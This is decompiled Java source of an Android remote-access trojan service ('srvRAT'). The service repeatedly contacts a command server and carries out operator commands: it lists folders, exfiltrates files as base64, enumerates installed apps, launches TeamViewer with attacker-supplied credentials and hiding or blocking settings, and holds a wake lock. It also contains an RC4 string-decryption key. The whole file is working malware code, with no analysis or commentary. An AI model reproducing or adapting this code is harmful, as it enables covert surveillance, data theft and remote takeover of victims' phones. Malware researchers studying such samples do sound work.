/*
 * Decompiled with CFR <Could not determine version>.
 * 
 * Could not load the following classes:
 *  android.app.IntentService
 *  android.content.Context
 *  android.content.Intent
 *  android.content.pm.ApplicationInfo
 *  android.content.pm.PackageManager
 *  android.os.Environment
 *  android.os.PowerManager
 *  android.os.PowerManager$WakeLock
 *  android.util.Base64
 *  org.json.JSONObject
 */
package com.example.mmm.Service;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.os.PowerManager;
import android.util.Base64;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Utils.utils;
import com.example.mmm.constants;
import java.io.File;
import java.util.List;
import org.json.JSONObject;

public class srvRAT
extends IntentService {
    utils after$ = new utils();
    constants losses$ = new constants();
    private String learn$;
    private PowerManager.WakeLock alloy$;

    public srvRAT() {
        super("");
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(srvRAT.class.getSimpleName());
        stringBuilder.append("   ");
        this.learn$ = stringBuilder.toString();
    }

    private String decrypt_str(String string) {
        return new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode((String)string, (int)0), "UTF-8"))));
    }

    protected void onHandleIntent(Intent object) {
        String string = this.after$.SettingsRead((Context)this, "QQ");
        do {
            utils.chalkTile(1000);
            if (this.after$.SettingsRead((Context)this, "RQ").equals("disconnect")) {
                this.stopSelf();
                return;
            }
            object = new JSONObject();
            object.put("ID", (Object)string);
            object.put("screen", (Object)utils._janet((Context)this));
            object.put("active_app", (Object)this.after$.SettingsRead((Context)this, "RW"));
            object.put("perm_storage", (Object)utils.hasPermission((Context)this, "android.permission.WRITE_EXTERNAL_STORAGE"));
            Object object2 = this.after$;
            Object object3 = this.after$;
            CharSequence charSequence2 = new StringBuilder();
            ((StringBuilder)charSequence2).append("q=rat_connect&ws=");
            ((StringBuilder)charSequence2).append(this.after$._grown(object.toString()));
            object = ((utils)object2)._marina(((utils)object3)._brought((Context)this, ((StringBuilder)charSequence2).toString()));
            object2 = utils._efforts(new JSONObject((String)object).getString("rat_cmd"));
            object3 = this.after$;
            charSequence2 = this.learn$;
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append("rat_cmd_base64_decode: ");
            stringBuilder.append((String)object);
            stringBuilder.append(" >>  ");
            stringBuilder.append((String)object2);
            ((utils)object3).Log((String)charSequence2, stringBuilder.toString());
            if (((String)object2).equals("rat_disconnect")) {
                this.after$.SettingsWrite((Context)this, "RQ", "disconnect");
                continue;
            }
            boolean bl = ((String)object2).contains("open_folder");
            int n2 = 0;
            if (bl) {
                object2 = new JSONObject((String)object2).getString("open_folder");
                object = object2;
                if (((String)object2).equals("~/")) {
                    Environment.getExternalStorageDirectory();
                    object = null;
                }
                object2 = this.after$._pants(null);
                object3 = new JSONObject();
                object3.put("cmd", (Object)"array_files_folder");
                object3.put("dir", (Object)utils._cookie((String)object));
                object3.put("folders", (Object)utils._cookie(object2[0]));
                object3.put("files", (Object)utils._cookie(object2[1]));
                object = object3.toString().replace("\\n", "");
                this.after$.Log("JSON_SEND", (String)object);
                object2 = this.after$;
                object3 = new StringBuilder();
                ((StringBuilder)object3).append("q=rat_cmd&ws=");
                ((StringBuilder)object3).append(this.after$._grown((String)object));
                ((utils)object2)._brought((Context)this, ((StringBuilder)object3).toString());
                continue;
            }
            if (((String)object2).contains("uploadind_file")) {
                object = new JSONObject((String)object2);
                object.getString("uploadind_file");
                object2 = null;
                object3 = Base64.encodeToString((byte[])utils._update((File)object2), (int)0);
                object = new JSONObject();
                object.put("cmd", (Object)"saved_file");
                object.put("ID", (Object)string);
                object.put("name", null);
                object.put("file_base64", object3);
                object2 = this.after$;
                object3 = new StringBuilder();
                ((StringBuilder)object3).append("q=rat_cmd&ws=");
                ((StringBuilder)object3).append(this.after$._grown(object.toString()));
                ((utils)object2)._brought((Context)this, ((StringBuilder)object3).toString());
                continue;
            }
            bl = ((String)object2).contains("get_apps");
            if (bl) {
                this.after$.Log(this.learn$, "GET APPS 1");
                object2 = new JSONObject();
                object = this.getPackageManager();
                for (CharSequence charSequence2 : object.getInstalledApplications(0)) {
                    if (object.getLaunchIntentForPackage(((ApplicationInfo)charSequence2).packageName) == null) continue;
                    object2.put(String.valueOf(n2), (Object)((ApplicationInfo)charSequence2).packageName);
                    ++n2;
                }
                object = new JSONObject();
                object.put("cmd", (Object)"saved_apps");
                object.put("apps", (Object)utils._cookie(object2.toString()));
                this.after$.Log(this.learn$, "GET APPS 2");
                object2 = this.after$;
                object3 = this.learn$;
                charSequence2 = new StringBuilder();
                ((StringBuilder)charSequence2).append("JSON: ");
                ((StringBuilder)charSequence2).append(object.toString());
                ((utils)object2).Log((String)object3, ((StringBuilder)charSequence2).toString());
                object2 = this.after$;
                object3 = new StringBuilder();
                ((StringBuilder)object3).append("q=rat_cmd&ws=");
                ((StringBuilder)object3).append(this.after$._grown(object.toString()));
                ((utils)object2)._brought((Context)this, ((StringBuilder)object3).toString());
                continue;
            }
            if (((String)object2).contains("connect_teamviewer")) {
                object = new JSONObject((String)object2);
                this.after$.SettingsWrite((Context)this, "RT", object.getString("connect_teamviewer"));
                this.after$.SettingsWrite((Context)this, "RY", object.getString("password"));
                this.after$.SettingsWrite((Context)this, "RS", object.getString("fake"));
                this.after$.SettingsWrite((Context)this, "RI", object.getString("hidden"));
                this.after$.SettingsWrite((Context)this, "RA", object.getString("blocking"));
                this.after$._bhutan((Context)this);
                utils.runApplication((Context)this, "com.teamviewer.host.market");
                continue;
            }
            if (((String)object2).contains("open_teamviewer")) {
                object = new JSONObject((String)object2);
                this.after$.SettingsWrite((Context)this, "RS", object.getString("fake"));
                this.after$.SettingsWrite((Context)this, "RI", object.getString("hidden"));
                this.after$.SettingsWrite((Context)this, "RA", object.getString("blocking"));
                this.after$._bhutan((Context)this);
                utils.runApplication((Context)this, "com.teamviewer.host.market");
                continue;
            }
            if (((String)object2).contains("send_settings")) {
                object = new JSONObject((String)object2);
                this.after$.SettingsWrite((Context)this, "RS", object.getString("fake"));
                this.after$.SettingsWrite((Context)this, "RI", object.getString("hidden"));
                this.after$.SettingsWrite((Context)this, "RA", object.getString("blocking"));
                this.after$._bhutan((Context)this);
                continue;
            }
            if (!((String)object2).contains("device_unlock")) continue;
            object = new JSONObject((String)object2);
            this.after$.SettingsWrite((Context)this, "RS", object.getString("fake"));
            this.after$.SettingsWrite((Context)this, "RI", object.getString("hidden"));
            this.after$.SettingsWrite((Context)this, "RA", object.getString("blocking"));
            if (this.alloy$ != null) {
                this.alloy$.release();
            }
            this.alloy$ = ((PowerManager)this.getSystemService("power")).newWakeLock(805306394, ((Object)((Object)this)).getClass().getName());
            this.alloy$.acquire();
        } while (true);
    }
}

